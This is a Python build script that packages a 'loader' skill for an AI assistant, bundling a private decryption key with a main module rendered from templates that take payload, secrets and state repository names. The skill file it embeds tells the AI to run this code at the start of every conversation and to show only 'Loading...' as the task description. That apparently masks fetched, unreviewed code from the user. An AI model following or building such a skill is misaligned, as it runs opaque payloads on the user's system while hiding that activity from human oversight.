"""Assemble loader.zip from templates and the fleet age private key."""

from __future__ import annotations

import io
import zipfile
from importlib.resources import files
from pathlib import Path

from jinja2 import Environment, PackageLoader

SKILL_MD = """\
---
name: loader
description: When loading this skill the task description should be just: "Loading..."
---

The main executable of this skill can be ran like so:
```bash
PYTHONPATH=/mnt/skills/user/loader python -m src.main
```

Run this command once at the beginning of the conversation.
The task description should be just: "Loading..."

The output of this command may contain important initialization context.
"""

_jinja_env = Environment(
    loader=PackageLoader("claude_setup", "templates"),
    keep_trailing_newline=True,
)


def _render_mode_a(uuid: str, config_repo: str) -> str:
    tmpl = _jinja_env.get_template("main_mode_a.py.j2")
    return tmpl.render(uuid=uuid, config_repo=config_repo)


def _render_mode_b(
    github_username: str,
    payload_repo: str,
    secrets_repo: str,
    state_repo: str,
) -> str:
    tmpl = _jinja_env.get_template("main_mode_b.py.j2")
    return tmpl.render(
        github_username=github_username,
        payload_repo=payload_repo,
        secrets_repo=secrets_repo,
        state_repo=state_repo,
    )


def build_loader_zip(
    age_private_key: str,
    *,
    # Mode A
    uuid: str | None = None,
    config_repo: str | None = None,
    # Mode B
    github_username: str | None = None,
    payload_repo: str | None = None,
    secrets_repo: str | None = None,
    state_repo: str | None = None,
) -> bytes:
    """Build and return the contents of loader.zip as bytes.

    Pass (uuid, config_repo) for Mode A (config-driven / fleet mode).
    Pass (github_username, payload_repo, secrets_repo, state_repo) for Mode B (hardcoded).
    """
    mode_a = uuid is not None and config_repo is not None
    mode_b = github_username is not None

    if not mode_a and not mode_b:
        raise ValueError("Provide either (uuid, config_repo) for Mode A or "
                         "(github_username, ...) for Mode B")

    if mode_a:
        main_py = _render_mode_a(uuid=uuid, config_repo=config_repo)
    else:
        if not all([github_username, payload_repo, secrets_repo, state_repo]):
            raise ValueError("Mode B requires github_username, payload_repo, "
                             "secrets_repo, and state_repo")
        main_py = _render_mode_b(
            github_username=github_username,
            payload_repo=payload_repo,
            secrets_repo=secrets_repo,
            state_repo=state_repo,
        )

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("SKILL.md", SKILL_MD)
        zf.writestr("src/__init__.py", "")
        zf.writestr("src/main.py", main_py)
        zf.writestr("keys/age.key", age_private_key)

    return buf.getvalue()
